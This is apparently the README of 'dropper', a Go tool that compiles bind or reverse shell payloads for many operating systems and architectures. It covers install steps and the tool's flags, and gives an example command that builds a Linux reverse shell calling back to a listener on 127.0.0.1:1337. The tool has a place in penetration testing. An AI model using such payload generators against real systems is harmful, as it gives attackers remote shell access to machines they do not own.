Dropper

In order to run dropper, you must already have your GOPATH configured properly.
For more information on setting up your GOPATH and Golang environment, please visit the golang wiki on GitHub: 

https://github.com/golang/go/wiki/SettingGOPATH

If everything is all set, navigate to your GOPATH on your system run clone the repo using `git` or `go`.

<code>git clone https://github.com/im4x5yn74x/dropper.git</code>

<code>go get github.com/im4x5yn74x/dropper</code>

Once cloned, change to the dropper folder and give it a test run.

<code>cd dropper/;</code>
<code>go run dropper.go</code>

+...|Choose an OS|...+

- windows
- linux
- freebsd
- nacl
- netbsd
- openbsd
- plan9
- solaris
- dragonfly
- darwin
- android

>_: 

Feel free to compile it and use provide arguments to quickly build your payloads. 

<code>go build dropper.go</code>
<code>./dropper -h</code>
Usage of ./dropper:
-a string
	Architecture: 386, amd64, amd64p32, arm, arm64, ppc64, ppc64le, mips, mipsle, mips64, mips64le, s390x, sparc64
-l string
	Listening host: <listening ip:port>
-o string
	Output filename: <anything goes>
-p string
	Operating System: windows, linux, freebsd, nacl, netbsd, openbsd, plan9, solaris, dragonfly, darwin, android
-s string
	Shell type: C:\Windows\System32\cmd.exe, C:\Windows\SYSWOW64\WindowsPowerShell\v1.0\powershell.exe, /bin/sh, /system/bin/sh
-t string
	Payload type: bind/reverse

 Example:
 <code>./dropper -o potato -p linux -l 127.0.0.1:1337 -s /bin/sh -t reverse</code>
 
